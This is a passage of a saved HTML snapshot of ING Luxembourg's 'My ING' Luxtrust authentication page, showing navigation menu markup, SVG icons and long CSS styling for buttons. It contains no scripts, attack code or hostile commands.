6.83712894,10.9501997 7.10846731,11.2303339 L7.38791347,11.5188389 L7.38956163,11.9187489 L7.39043915,12.1340309 C7.39255687,12.3816813 7.39313378,12.4866622 7.39259716,12.6226496 C7.39115588,12.9878917 7.37942247,13.3010342 7.35092429,13.6474146 L7.33797972,13.804749 L7.27676113,13.9504812 C6.93649819,14.7604849 6.27673989,15.1992522 5.00439809,15.7380554 C4.85752036,15.8002542 4.73936331,15.8488924 4.46676117,15.9600824 C2.80335677,16.6384492 1.85847181,17.1861542 1.37426999,17.996795 C2.5162964,17.9967958 14.615845,17.9967958 16.6176881,18.0191579 Z"
                                                        id=icon_user fill=#575C61 sketch:type=MSShapeGroup></path>
                                                </svg></icon>
                                            <span class=menu-item-label ng-bind="item.label | translate">Se
                                                connecter</span>
                                        </button>

                                    <li ng-repeat="item in menuItems">

                                        <a ng-if=!item.handleClickEvent ng-href=#!/contact
                                            class="ing-focus-outline ing-focus-outline-dark-md bs-px-4"
                                            ng-class="{'active': isActive(item.href), 'subitem': !item.icon}"
                                            ng-attr-aria-current="{{ isActive(item.href) ? 'page' : undefined}}"
                                            href="#">
                                            <icon ng-if=::item.icon type=email><svg width=20px height=20px
                                                    preserveAspectRatio=xMidYMax viewBox="0 0 18 12" aria-hidden=true>
                                                    <path
                                                        d="M0,11 C0,11.556 0.445,12 0.994,12 L17.007,12 C17.555,12 18,11.552 18,11 L18,1 C18,0.444 17.555,0 17.007,0 L0.994,0 C0.445,0 0,0.448 0,1 L0,11 L0,11 Z M17.006,1 L17.006,1.511 L9.964,6.983 C9.721,7.173 9.37,7.281 9,7.281 C8.631,7.281 8.28,7.173 8.036,6.983 L0.995,1.508 L0.995,1 L17.006,1 L17.006,1 Z M12.043,6.633 L17.006,10.492 L17.006,10.997 L1,10.997 L1,10.489 L5.958,6.633 L7.422,7.773 C7.858,8.112 8.429,8.281 9,8.281 C9.571,8.281 10.142,8.112 10.578,7.773 L12.043,6.633 L12.043,6.633 Z M0.995,2.774 L5.143,6 L0.999,9.223 L0.995,2.774 L0.995,2.774 Z M17.006,9.226 L12.857,6 L17.006,2.777 L17.006,9.226 L17.006,9.226 Z"
                                                        id=icon_email fill=#575C61 sketch:type=MSShapeGroup></path>
                                                </svg></icon>
                                            <span class=menu-item-label ng-bind="item.label | translate">Contact</span>
                                        </a>



                                    <li ng-repeat="item in menuItems">

                                        <a ng-if=!item.handleClickEvent ng-href=#!/feedback
                                            class="ing-focus-outline ing-focus-outline-dark-md bs-px-4"
                                            ng-class="{'active': isActive(item.href), 'subitem': !item.icon}"
                                            ng-attr-aria-current="{{ isActive(item.href) ? 'page' : undefined}}"
                                            href="#">
                                            <icon ng-if=::item.icon type=star><svg width=20px height=20px
                                                    preserveAspectRatio=xMidYMid viewBox="0 0 18 17" aria-hidden=true>
                                                    <path
                                                        d="M3.4376941,17 L4.5,10.8493422 L0,6.49342219 L6.21884705,5.59605331 L9,0 L11.7811529,5.59605331 L18,6.49342219 L13.5,10.8493422 L14.5623059,17 L9,14.0960533 L3.4376941,17 Z M9,12.9163956 L13.1635206,15.0779242 L12.3702243,10.4848079 L15.7543074,7.22449056 L11.0829131,6.55041644 L8.99999964,2.40153708 L6.91708685,6.55041644 L2.26691438,7.22961792 L5.62977573,10.4848079 L4.83191909,15.1043278 L9,12.9163956 Z"
                                                        id=icon_star fill=#515657 sketch:type=MSShapeGroup></path>
                                                </svg></icon>
                                            <span class=menu-item-label ng-bind="item.label | translate">Feedback sur
                                                l'app</span>
                                        </a>



                                    <li ng-repeat="item in menuItems">

                                        <a ng-if=!item.handleClickEvent ng-href=#!/settings
                                            class="ing-focus-outline ing-focus-outline-dark-md bs-px-4"
                                            ng-class="{'active': isActive(item.href), 'subitem': !item.icon}"
                                            ng-attr-aria-current="{{ isActive(item.href) ? 'page' : undefined}}"
                                            href="#">
                                            <icon ng-if=::item.icon type=settings><svg width=20px height=20px
                                                    preserveAspectRatio=xMidYMax viewBox="0 0 16 16" aria-hidden=true>
                                                    <path
                                                        d="M8.373,1 L8.746,3.125 L9.346,3.298 C9.7,3.4 10.042,3.543 10.362,3.721 L10.917,4.03 L12.669,2.77 L13.214,3.315 L11.968,5.09 L12.271,5.637 C12.446,5.954 12.587,6.295 12.69,6.648 L12.865,7.254 L13.489,7.357 L15,7.603 L15,8.374 L13.478,8.641 L12.862,8.75 L12.69,9.351 C12.589,9.704 12.449,10.043 12.274,10.36 L11.967,10.914 L13.231,12.669 L12.686,13.214 L10.912,11.97 L10.364,12.277 C10.045,12.456 9.703,12.598 9.348,12.702 L8.752,12.875 L8.375,15 L7.601,15 L7.248,12.88 L6.64,12.707 C6.286,12.605 5.942,12.464 5.619,12.285 L5.073,11.983 L4.562,12.341 L3.314,13.214 L2.768,12.667 L4.013,10.926 L3.705,10.372 C3.524,10.048 3.381,9.704 3.279,9.349 L3.107,8.748 L1,8.375 L1,7.601 L2.486,7.354 L3.108,7.25 L3.282,6.644 C3.385,6.287 3.529,5.942 3.709,5.618 L4.013,5.072 L2.784,3.314 L3.331,2.767 L5.076,4.014 L5.628,3.71 C5.948,3.533 6.291,3.393 6.645,3.292 L7.257,3.119 L7.603,1 L8.373,1 L8.373,1 Z M8.02,10.92 C9.619,10.92 10.92,9.619 10.92,8.02 C10.92,6.421 9.619,5.12 8.02,5.12 C6.421,5.12 5.12,6.421 5.12,8.02 C5.12,9.619 6.421,10.92 8.02,10.92 L8.02,10.92 Z M9.213,0 L6.753,0 L6.372,2.33 C5.943,2.452 5.532,2.621 5.145,2.834 L3.223,1.461 L1.484,3.2 L2.835,5.132 C2.618,5.522 2.445,5.937 2.321,6.368 L0,6.754 L0,9.213 L2.318,9.624 C2.441,10.054 2.613,10.468 2.831,10.859 L1.461,12.775 L3.2,14.515 L5.135,13.16 C5.525,13.376 5.937,13.546 6.365,13.668 L6.754,16 L9.213,16 L9.628,13.662 C10.056,13.537 10.467,13.365 10.853,13.149 L12.8,14.516 L14.54,12.775 L13.149,10.843 C13.362,10.459 13.53,10.051 13.651,9.626 L16,9.214 L16,6.753 L13.65,6.37 C13.527,5.945 13.359,5.538 13.146,5.153 L14.515,3.202 L12.775,1.462 L10.849,2.847 C10.46,2.631 10.049,2.46 9.623,2.337 L9.213,0 L9.213,0 Z M8.02,9.92 C6.973,9.92 6.12,9.068 6.12,8.02 C6.12,6.972 6.973,6.12 8.02,6.12 C9.068,6.12 9.92,6.972 9.92,8.02 C9.92,9.068 9.068,9.92 8.02,9.92 L8.02,9.92 Z"
                                                        id=icon_settings fill=#575C61 sketch:type=MSShapeGroup></path>
                                                </svg></icon>
                                            <span class=menu-item-label ng-bind="item.label | translate">Langue</span>
                                        </a>


                                        <hr ng-if=item.separator class="bs-mx-4 bs-my-2">
                                    <li ng-repeat="item in menuItems">

                                        <a ng-if=!item.handleClickEvent ng-href=#!/about/LEGAL_NOTES
                                            class="ing-focus-outline ing-focus-outline-dark-md bs-px-4 subitem"
                                            ng-class="{'active': isActive(item.href), 'subitem': !item.icon}"
                                            ng-attr-aria-current="{{ isActive(item.href) ? 'page' : undefined}}"
                                            href="#">

                                            <span class=menu-item-label ng-bind="item.label | translate">Mentions
                                                légales</span>
                                        </a>



                                    <li ng-repeat="item in menuItems">

                                        <a ng-if=!item.handleClickEvent ng-href=#!/security-advices
                                            class="ing-focus-outline ing-focus-outline-dark-md bs-px-4 subitem"
                                            ng-class="{'active': isActive(item.href), 'subitem': !item.icon}"
                                            ng-attr-aria-current="{{ isActive(item.href) ? 'page' : undefined}}"
                                            href="#">

                                            <span class=menu-item-label ng-bind="item.label | translate">Conseils
                                                sécurité</span>
                                        </a>



                                    <li ng-repeat="item in menuItems">

                                        <a ng-if=!item.handleClickEvent ng-href=#!/about/ABOUT_US
                                            class="ing-focus-outline ing-focus-outline-dark-md bs-px-4 subitem"
                                            ng-class="{'active': isActive(item.href), 'subitem': !item.icon}"
                                            ng-attr-aria-current="{{ isActive(item.href) ? 'page' : undefined}}"
                                            href="#">

                                            <span class=menu-item-label ng-bind="item.label | translate">Qui sommes-nous
                                                ?</span>
                                        </a>



                                    </li>
                                </ul>
                            </div>
                            <div class="virtual-scrollbar-track hidden sf-hidden"></div>
                        </div>
                    </div>
                </div>
            </div>
        </nav>
        <div id=contentpane>
            <header role=banner ng-include=templates.header>
                <div class="navbar navbar-default navbar-inverse navbar-static-top" ng-controller=HeaderCtrl>
                    <div class=ing-header>
                        <p id=accessible-page-title tabindex=-1 class="bs-visually-hidden bs-outline-0">Authentification
                            Luxtrust | My ING</p>
                        <div ng-show=headerState.allowBack class="bs-navbar-back bs-ps-2" ing-inert=menuState.opened>
                            <ing-button text grey icon-only icon20 ng-click=back()
                                aria-label="Revenir à la page précédente" role=button tabindex=0 type=submit><template
                                    shadowrootmode=open>
                                    <style>
                                    :host {
                                        position: relative;
                                        display: inline-flex;
                                        box-sizing: border-box;
                                        vertical-align: middle;
                                        line-height: 24px;
                                        background-color: #eee;
                                        padding: 8px;
                                        outline: none;
                                        cursor: default;
                                        user-select: none;
                                        -webkit-user-select: none;
                                        -moz-user-select: none;
                                        -ms-user-select: none
                                    }

                                    :host::before {
                                        content: "";
                                        position: absolute;
                                        top: 50%;
                                        left: 50%;
                                        transform: translate(-50%, -50%);
                                        min-height: 44px;
                                        min-width: 44px;
                                        width: 100%;
                                        height: 100%
                                    }

                                    .button-content {
                                        display: flex;
                                        align-items: center;
                                        justify-content: center
                                    }

                                    :host(:focus:not([disabled])),
                                    :host(:focus-visible) {
                                        outline: 2px solid #bde4ff
                                    }

                                    :host(:focus:not(:focus-visible)) {
                                        outline: 0
                                    }

                                    :host(:hover) {
                                        background: #f4f6f7
                                    }

                                    :host(:active),
                                    :host([active]) {
                                        background: gray
                                    }

                                    :host([hidden]) {
                                        display: none
                                    }

                                    :host([disabled]) {
                                        pointer-events: none;
                                        background: lightgray;
                                        color: #adadad;
                                        fill: #adadad
                                    }
                                    </style>
                                    <style>
                                    :host {
                                        position: relative;
                                        display: inline-flex;
                                        min-height: 16px;
                                        align-items: center;
                                        justify-content: center;
                                        padding-top: 8px;
                                        padding-right: 16px;
                                        padding-bottom: 8px;
                                        padding-left: 16px;
                                        border-radius: 8px;
                                        font-size: 1.1875rem;
                                        font-weight: bold;
                                        line-height: 1.75rem;
                                        outline: 0
                                    }

                                    :host([font16]) {
                                        padding-top: 6px;
                                        padding-right: 12px;
                                        padding-bottom: 6px;
                                        padding-left: 12px;
                                        font-size: 1rem;
                                        font-weight: bold;
                                        line-height: 1.5rem
                                    }

                                    :host([font14]) {
                                        padding-top: 6px;
                                        padding-right: 10px;
                                        padding-bottom: 6px;
                                        padding-left: 10px;
                                        font-size: 0.875rem;
                                        font-weight: bold;
                                        line-height: 1.25rem
                                    }

                                    :host([font12]) {
                                        padding-top: 6px;
                                        padding-right: 8px;
                                        padding-bottom: 6px;
                                        padding-left: 8px;
                                        font-size: 0.75rem;
                                        font-weight: bold;
                                        line-height: 1rem
                                    }

                                    :host(:focus:not([disabled])) {
                                        outline: none
                                    }

                                    ::slotted([slot="icon-before"]) {
                                        flex-shrink: 0;
                                        margin-right: 8px
                                    }

                                    ::slotted([slot="icon-after"]) {
                                        flex-shrink: 0;
                                        margin-left: 8px
                                    }

                                    ::slotted([slot="icon-before"]),
                                    ::slotted([slot="icon-after"]) {
                                        width: 24px;
                                        height: 24px
                                    }

                                    :host([font16]) ::slotted([slot="icon-before"]),
                                    :host([font16]) ::slotted([slot="icon-after"]) {
                                        width: 20px;
                                        height: 20px
                                    }

                                    :host([font14]) ::slotted([slot="icon-before"]),
                                    :host([font14]) ::slotted([slot="icon-after"]) {
                                        width: 16px;
                                        height: 16px
                                    }

                                    :host([disabled]) {
                                        background-color: transparent;
                                        pointer-events: none
                                    }

                                    ::slotted(button) {
                                        position: absolute;
                                        top: 0;
                                        overflow: hidden;
                                        width: 1px;
                                        height: 1px;
                                        padding: 0;
                                        border: 0;
                                        margin: 0;
                                        clip: rect(1px, 1px, 1px, 1px);
                                        clip-path: inset(100%);
                                        white-space: nowrap
                                    }
                                    </style>
                                    <style>
                                    :host,
                                    html {
                                        --_filledButton_web_root_borderWidth_focus: 0.063rem;
                                        --_filledButton_web_root_borderStyle_focus: var(--border_info_style);
                                        --_filledButton_web_root_borderWidth_disabled: 0.063rem;
                                        --_filledButton_web_root_borderStyle_disabled: var(--border_disabled_style);
                                        --_filledButton_web_text_fg_generic: var(--fg_onColor);
                                        --_filledButton_web_text_fg_gray200: var(--fg_default);
                                        --_filledButton_web_text_fg_white: var(--fg_default);
                                        --_filledButton_web_text_fg_white-pressed: var(--fg_onColor);
                                        --_filledButton_web_text_fg_sky: var(--fg_onColor);
                                        --_filledButton_web_text_fg_disabled: var(--fg_disabled);
                                        --_filledButton_web_root_bg_indigo: var(--bg_secondary);
                                        --_filledButton_web_root_bg_indigo-pressed: rgba(82, 81, 153, 0.6);
                                        --_filledButton_web_root_bg_gray200: var(--bg_subtle);
                                        --_filledButton_web_root_bg_gray200-pressed: rgba(217, 217, 217, 0.6);
                                        --_filledButton_web_root_bg_orange: var(--bg_primary);
                                        --_filledButton_web_root_bg_orange-pressed: rgba(255, 98, 0, 0.6);
                                        --_filledButton_web_root_bg_sky: var(--bg_info);
                                        --_filledButton_web_root_bg_sky-pressed: rgba(85, 155, 209, 0.6);
                                        --_filledButton_web_root_bg_white: var(--bg_default);
                                        --_filledButton_web_root_bg_white-pressed: rgba(255, 255, 255, 0.6);
                                        --_filledButton_web_root_borderColor_focus: var(--border_info_color);
                                        --_filledButton_web_root_borderColor_disabled: var(--border_disabled_color)
                                    }

                                    :host,
                                    html {
                                        --_iconFilledButton_web_root_borderWidth_disabled: 0.063rem;
                                        --_iconFilledButton_web_root_borderStyle_disabled: var(--border_disabled_style);
                                        --_iconFilledButton_web_root_bg_indigo: var(--bg_secondary);
                                        --_iconFilledButton_web_root_bg_indigo-pressed: rgba(82, 81, 153, 0.6);
                                        --_iconFilledButton_web_root_bg_orange: var(--bg_primary);
                                        --_iconFilledButton_web_root_bg_orange-pressed: rgba(255, 98, 0, 0.6);
                                        --_iconFilledButton_web_root_bg_sky: var(--bg_info);
                                        --_iconFilledButton_web_root_bg_sky-pressed: rgba(85, 155, 209, 0.6);
                                        --_iconFilledButton_web_root_borderColor_disabled: var(--border_disabled_color);
                                        --_iconFilledButton_web_icon_fg_generic: var(--fg_onColor);
                                        --_iconFilledButton_web_icon_fg_disabled: var(--fg_disabled);
                                        --_iconFilledButton_web_text_fg_generic: var(--fg_onColor);
                                        --_iconFilledButton_web_text_fg_disabled: var(--fg_disabled)
                                    }

                                    :host,
                                    html {
                                        --_nextFilledButton_web_root_borderWidth_focus: 0.063rem;
                                        --_nextFilledButton_web_root_borderStyle_focus: var(--border_info_style);
                                        --_nextFilledButton_web_root_borderWidth_white-focus: 0.063rem;
                                        --_nextFilledButton_web_root_borderStyle_white-focus: var(--border_info-inverse_style);
                                        --_nextFilledButton_web_root_borderWidth_disabled: 0.063rem;
                                        --_nextFilledButton_web_root_borderStyle_disabled: var(--border_disabled_style);
                                        --_nextFilledButton_web_text_fg_indigo: var(--fg_onColor);
                                        --_nextFilledButton_web_text_fg_white: var(--fg_default);
                                        --_nextFilledButton_web_text_fg_white-pressed: var(--fg_onColor);
                                        --_nextFilledButton_web_text_fg_gray200: var(--fg_default);
                                        --_nextFilledButton_web_text_fg_disabled: var(--fg_disabled);
                                        --_nextFilledButton_web_icon_fg_indigo: var(--fg_onColor);
                                        --_nextFilledButton_web_icon_fg_white: var(--fg_subtle);
                                        --_nextFilledButton_web_icon_fg_white-pressed: var(--fg_onColor);
                                        --_nextFilledButton_web_icon_fg_gray200: var(--fg_subtle);
                                        --_nextFilledButton_web_icon_fg_disabled: var(--fg_disabled);
                                        --_nextFilledButton_web_root_bg_indigo: var(--bg_secondary);
                                        --_nextFilledButton_web_root_bg_indigo-pressed: rgba(82, 81, 153, 0.6);
                                        --_nextFilledButton_web_root_bg_white: var(--bg_default);
                                        --_nextFilledButton_web_root_bg_white-pressed: rgba(255, 255, 255, 0.6);
                                        --_nextFilledButton_web_root_bg_gray200: var(--bg_subtle);
                                        --_nextFilledButton_web_root_bg_gray200-pressed: rgba(217, 217, 217, 0.6);
                                        --_nextFilledButton_web_root_borderColor_focus: var(--border_info_color);
                                        --_nextFilledButton_web_root_borderColor_white-focus: var(--border_info-inverse_color);
                                        --_nextFilledButton_web_root_borderColor_disabled: var(--border_disabled_color)
                                    }

                                    :host,
                                    html {
                                        --_previousFilledButton_web_root_borderWidth_focus: 0.063rem;
                                        --_previousFilledButton_web_root_borderStyle_focus: var(--border_info_style);
                                        --_previousFilledButton_web_root_borderWidth_disabled: 0.063rem;
                                        --_previousFilledButton_web_root_borderStyle_disabled: var(--border_disabled_style);
                                        --_previousFilledButton_web_text_fg_indigo: var(--fg_onColor);
                                        --_previousFilledButton_web_text_fg_white: var(--fg_default);
                                        --_previousFilledButton_web_text_fg_white-pressed: var(--fg_onColor);
                                        --_previousFilledButton_web_text_fg_gray200: var(--fg_default);
                                        --_previousFilledButton_web_text_fg_disabled: var(--fg_disabled);
                                        --_previousFilledButton_web_icon_fg_indigo: var(--fg_onColor);
                                        --_previousFilledButton_web_icon_fg_white: var(--fg_subtle);
                                        --_previousFilledButton_web_icon_fg_white-pressed: var(--fg_onColor);
                                        --_previousFilledButton_web_icon_fg_gray200: var(--bg_subtle);
                                        --_previousFilledButton_web_icon_fg_disabled: var(--fg_disabled);
                                        --_previousFilledButton_web_root_bg_indigo: var(--bg_secondary);
                                        --_previousFilledButton_web_root_bg_indigo-pressed: rgba(82, 81, 153, 0.6);
                                        --_previousFilledButton_web_root_bg_white: var(--bg_default);
                                        --_previousFilledButton_web_root_bg_white-pressed: rgba(255, 255, 255, 0.6);
                                        --_previousFilledButton_web_root_bg_gray200: var(--bg_subtle);
                                        --_previousFilledButton_web_root_bg_gray200-pressed: rgba(217, 217, 217, 0.6);
                                        --_previousFilledButton_web_root_bg_disabled: var(--fg_disabled);
                                        --_previousFilledButton_web_root_borderColor_focus: var(--border_info_color);
                                        --_previousFilledButton_web_root_borderColor_disabled: var(--border_disabled_color)
                                    }

                                    :host([filled]) {
                                        --__box-shadow-on-hover: 0 0 0 0
                                    }

                                    :host([filled]:hover) {
                                        --__box-shadow-on-hover: 0 0 8px 0 rgba(0 0 0/12%), 0 8px 8px 0 rgba(0 0 0/24%)
                                    }

                                    :host([filled]) {
                                        background-color: var(--_filledButton_web_root_bg_orange);
                                        box-shadow: var(--__box-shadow-on-hover);
                                        color: var(--_filledButton_web_text_fg_generic)
                                    }

                                    :host([filled]) ::slotted([slot="icon-before"]) {
                                        fill: var(--_filledButton_web_text_fg_generic)
                                    }

                                    :host([filled]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_filledButton_web_text_fg_generic)
                                    }

                                    :host([filled][indigo]) {
                                        background-color: var(--_filledButton_web_root_bg_indigo);
                                        color: var(--_filledButton_web_text_fg_generic)
                                    }

                                    :host([filled][sky]) {
                                        background-color: var(--_filledButton_web_root_bg_sky);
                                        color: var(--_filledButton_web_text_fg_generic)
                                    }

                                    :host([filled][grey]) {
                                        background-color: var(--_filledButton_web_root_bg_gray200);
                                        color: var(--_filledButton_web_text_fg_gray200)
                                    }

                                    :host([filled][inverted]) {
                                        background-color: var(--_filledButton_web_root_bg_white);
                                        color: var(--_filledButton_web_text_fg_white)
                                    }

                                    :host([filled][grey]) ::slotted([slot="icon-before"]),
                                    :host([filled][grey]) ::slotted([slot="icon-after"]) {
                                        fill: var(--fg_default)
                                    }

                                    :host([filled][inverted]) ::slotted([slot="icon-before"]),
                                    :host([filled][inverted]) ::slotted([slot="icon-after"]) {
                                        fill: var(--fg_default)
                                    }

                                    :host([filled]:hover) {
                                        box-shadow: 0 0 8px 0 rgb(0 0 0/12%), 0 8px 8px 0 rgb(0 0 0/24%)
                                    }

                                    :host([filled]:active),
                                    :host([filled][active]) {
                                        background-color: var(--_filledButton_web_root_bg_orange-pressed)
                                    }

                                    :host([filled][indigo]:active),
                                    :host([filled][indigo][active]) {
                                        background-color: var(--_filledButton_web_root_bg_indigo-pressed)
                                    }

                                    :host([filled][sky]:active),
                                    :host([filled][sky][active]) {
                                        background-color: var(--_filledButton_web_root_bg_sky-pressed)
                                    }

                                    :host([filled][grey]:active),
                                    :host([filled][grey][active]) {
                                        background-color: var(--_filledButton_web_root_bg_gray200-pressed)
                                    }

                                    :host([filled][inverted]:active),
                                    :host([filled][inverted][active]) {
                                        background-color: var(--_filledButton_web_root_bg_white-pressed)
                                    }

                                    :host([filled]:focus) {
                                        box-shadow: inset 0 0 0 4px var(--border_focus-inner_color), var(--__box-shadow-on-hover);
                                        outline: 2px solid var(--border_focus-outer_color);
                                        outline-offset: -2px
                                    }

                                    :host([filled][inverted]:focus) {
                                        box-shadow: inset 0 0 0 4px var(--border_focus-outer_color), var(--__box-shadow-on-hover);
                                        outline-color: var(--border_focus-inner_color)
                                    }

                                    :host([filled][disabled]) {
                                        border-width: 1px;
                                        border-style: var(--_filledButton_web_root_borderStyle_disabled);
                                        border-color: var(--_filledButton_web_root_borderWidth_disabled);
                                        background-color: transparent;
                                        color: var(--_filledButton_web_text_fg_disabled)
                                    }

                                    :host([filled][disabled]) ::slotted([slot="icon-before"]),
                                    :host([filled][disabled]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_filledButton_web_text_fg_disabled)
                                    }

                                    :host([filled][disabled]) {
                                        padding-top: 7px;
                                        padding-right: 15px;
                                        padding-bottom: 7px;
                                        padding-left: 15px;
                                        border-radius: 7px
                                    }

                                    :host([filled][font16][disabled]) {
                                        padding-top: 5px;
                                        padding-right: 11px;
                                        padding-bottom: 5px;
                                        padding-left: 11px
                                    }

                                    :host([filled][font14][disabled]) {
                                        padding-top: 5px;
                                        padding-right: 9px;
                                        padding-bottom: 5px;
                                        padding-left: 9px
                                    }

                                    :host([filled][font12][disabled]) {
                                        padding-top: 5px;
                                        padding-right: 7px;
                                        padding-bottom: 5px;
                                        padding-left: 7px
                                    }

                                    @media (forced-colors:active) {
                                        :host([filled]) {
                                            border: 1px solid ButtonBorder
                                        }

                                        :host([filled]) ::slotted([slot="icon-before"]),
                                        :host([filled]) ::slotted([slot="icon-after"]) {
                                            fill: ButtonText
                                        }

                                        :host([filled]:hover),
                                        :host([filled][sky]:hover),
                                        :host([filled][indigo]:hover),
                                        :host([filled][grey]:hover),
                                        :host([filled]:focus),
                                        :host([filled][sky]:focus),
                                        :host([filled][indigo]:focus),
                                        :host([filled][grey]:focus) {
                                            border-color: Highlight;
                                            color: Highlight
                                        }

                                        :host([filled]:hover) ::slotted([slot="icon-before"]),
                                        :host([filled]:hover) ::slotted([slot="icon-after"]),
                                        :host([filled]:focus) ::slotted([slot="icon-before"]),
                                        :host([filled]:focus) ::slotted([slot="icon-after"]) {
                                            fill: Highlight
                                        }

                                        :host([filled][active]) {
                                            border-color: SelectedItem;
                                            color: SelectedItem
                                        }

                                        :host([filled][active]) ::slotted([slot="icon-before"]),
                                        :host([filled][active]) ::slotted([slot="icon-after"]) {
                                            fill: SelectedItem
                                        }

                                        :host([filled][disabled]) {
                                            border-color: GrayText;
                                            color: GrayText
                                        }

                                        :host([filled][disabled]) ::slotted([slot="icon-before"]),
                                        :host([filled][disabled]) ::slotted([slot="icon-after"]) {
                                            fill: GrayText
                                        }
                                    }
                                    </style>
                                    <style>
                                    :host,
                                    html {
                                        --_outlineButton_web_root_borderWidth_indigo-initial: 0.063rem;
                                        --_outlineButton_web_root_borderStyle_indigo-initial: var(--border_secondary_style);
                                        --_outlineButton_web_root_borderWidth_focus: 0.063rem;
                                        --_outlineButton_web_root_borderStyle_focus: var(--border_info_style);
                                        --_outlineButton_web_root_borderWidth_gray400-initial: 0.063rem;
                                        --_outlineButton_web_root_borderStyle_gray400-initial: var(--border_default_style);
                                        --_outlineButton_web_root_borderWidth_gray400-focus: 0.063rem;
                                        --_outlineButton_web_root_borderStyle_gray400-focus: var(--border_info_style);
                                        --_outlineButton_web_root_borderWidth_orange-initial: 0.063rem;
                                        --_outlineButton_web_root_borderStyle_orange-initial: var(--border_primary_style);
                                        --_outlineButton_web_root_borderWidth_orange-focus: 0.063rem;
                                        --_outlineButton_web_root_borderStyle_orange-focus: var(--border_info_style);
                                        --_outlineButton_web_root_borderWidth_sky-initial: 0.063rem;
                                        --_outlineButton_web_root_borderStyle_sky-initial: var(--border_info_style);
                                        --_outlineButton_web_root_borderWidth_sky-focus: 0.063rem;
                                        --_outlineButton_web_root_borderStyle_sky-focus: var(--border_info_style);
                                        --_outlineButton_web_root_borderWidth_white-initial: 0.063rem;
                                        --_outlineButton_web_root_borderStyle_white-initial: var(--border_inverse_style);
                                        --_outlineButton_web_root_borderWidth_white-focus: 0.063rem;
                                        --_outlineButton_web_root_borderStyle_white-focus: var(--border_info-inverse_style);
                                        --_outlineButton_web_root_borderWidth_disabled: 0.063rem;
                                        --_outlineButton_web_root_borderStyle_disabled: var(--border_disabled_style);
                                        --_outlineButton_web_text_fg_indigo: var(--fg_secondary);
                                        --_outlineButton_web_text_fg_hover: var(--fg_onColor);
                                        --_outlineButton_web_text_fg_pressed: var(--fg_onColor);
                                        --_outlineButton_web_text_fg_gray400: var(--fg_subtle);
                                        --_outlineButton_web_text_fg_gray400-hover: var(--fg_default);
                                        --_outlineButton_web_text_fg_gray400-pressed: var(--fg_default);
                                        --_outlineButton_web_text_fg_orange: var(--fg_primary);
                                        --_outlineButton_web_text_fg_sky: var(--fg_info);
                                        --_outlineButton_web_text_fg_sky-hover: var(--fg_onColor);
                                        --_outlineButton_web_text_fg_sky-pressed: var(--fg_onColor);
                                        --_outlineButton_web_text_fg_white: var(--fg_inverse);
                                        --_outlineButton_web_text_fg_white-hover: var(--fg_default);
                                        --_outlineButton_web_text_fg_white-pressed: var(--fg_default);
                                        --_outlineButton_web_text_fg_disabled: var(--fg_disabled);
                                        --_outlineButton_web_root_borderColor_indigo-initial: var(--border_secondary_color);
                                        --_outlineButton_web_root_borderColor_focus: var(--border_info_color);
                                        --_outlineButton_web_root_borderColor_gray400-initial: var(--border_default_color);
                                        --_outlineButton_web_root_borderColor_gray400-focus: var(--border_info_color);
                                        --_outlineButton_web_root_borderColor_orange-initial: var(--border_primary_color);
                                        --_outlineButton_web_root_borderColor_orange-focus: var(--border_info_color);
                                        --_outlineButton_web_root_borderColor_sky-initial: var(--border_info_color);
                                        --_outlineButton_web_root_borderColor_sky-focus: var(--border_info_color);
                                        --_outlineButton_web_root_borderColor_white-initial: var(--border_inverse_color);
                                        --_outlineButton_web_root_borderColor_white-focus: var(--border_info-inverse_color);
                                        --_outlineButton_web_root_borderColor_disabled: var(--border_disabled_color);
                                        --_outlineButton_web_root_bg_indigo-hover: var(--bg_secondary);
                                        --_outlineButton_web_root_bg_indigo-pressed: rgba(82, 81, 153, 0.6);
                                        --_outlineButton_web_root_bg_gray400-hover: var(--bg_subtle);
                                        --_outlineButton_web_root_bg_gray400-pressed: rgba(217, 217, 217, 0.6);
                                        --_outlineButton_web_root_bg_orange-hover: var(--bg_primary);
                                        --_outlineButton_web_root_bg_orange-pressed: rgba(255, 98, 0, 0.6);
                                        --_outlineButton_web_root_bg_sky-hover: var(--bg_info);
                                        --_outlineButton_web_root_bg_sky-pressed: rgba(85, 155, 209, 0.6);
                                        --_outlineButton_web_root_bg_white-hover: var(--bg_default);
                                        --_outlineButton_web_root_bg_white-pressed: rgba(255, 255, 255, 0.6)
                                    }

                                    :host,
                                    html {
                                        --_iconOutlineButton_web_root_borderWidth_gray400-initial: 0.063rem;
                                        --_iconOutlineButton_web_root_borderStyle_gray400-initial: var(--border_default_style);
                                        --_iconOutlineButton_web_root_borderWidth_gray400-focus: 0.063rem;
                                        --_iconOutlineButton_web_root_borderStyle_gray400-focus: var(--border_info_style);
                                        --_iconOutlineButton_web_root_borderWidth_orange-intial: 0.063rem;
                                        --_iconOutlineButton_web_root_borderStyle_orange-intial: var(--border_primary_style);
                                        --_iconOutlineButton_web_root_borderWidth_orange-focus: 0.063rem;
                                        --_iconOutlineButton_web_root_borderStyle_orange-focus: var(--border_info_style);
                                        --_iconOutlineButton_web_root_borderWidth_white-initial: 0.063rem;
                                        --_iconOutlineButton_web_root_borderStyle_white-initial: var(--border_inverse_style);
                                        --_iconOutlineButton_web_root_borderWidth_white-focus: 0.063rem;
                                        --_iconOutlineButton_web_root_borderStyle_white-focus: var(--border_info-inverse_style);
                                        --_iconOutlineButton_web_root_borderWidth_indigo-initial: 0.063rem;
                                        --_iconOutlineButton_web_root_borderStyle_indigo-initial: var(--border_secondary_style);
                                        --_iconOutlineButton_web_root_borderWidth_indigo-focus: 0.063rem;
                                        --_iconOutlineButton_web_root_borderStyle_indigo-focus: var(--border_info_style);
                                        --_iconOutlineButton_web_root_borderWidth_disabled: 0.063rem;
                                        --_iconOutlineButton_web_root_borderStyle_disabled: var(--border_disabled_style);
                                        --_iconOutlineButton_web_icon_fg_gray400: var(--fg_subtle);
                                        --_iconOutlineButton_web_icon_fg_orange: var(--fg_primary);
                                        --_iconOutlineButton_web_icon_fg_orange-hover: var(--fg_onColor);
                                        --_iconOutlineButton_web_icon_fg_orange-pressed: var(--fg_onColor);
                                        --_iconOutlineButton_web_icon_fg_white: var(--fg_inverse);
                                        --_iconOutlineButton_web_icon_fg_white-pressed: var(--fg_onColor);
                                        --_iconOutlineButton_web_icon_fg_white-hover: var(--fg_subtle);
                                        --_iconOutlineButton_web_icon_fg_indigo-initial: var(--fg_secondary);
                                        --_iconOutlineButton_web_icon_fg_indigo-focus: var(--fg_secondary);
                                        --_iconOutlineButton_web_icon_fg_indigo-hover: var(--fg_onColor);
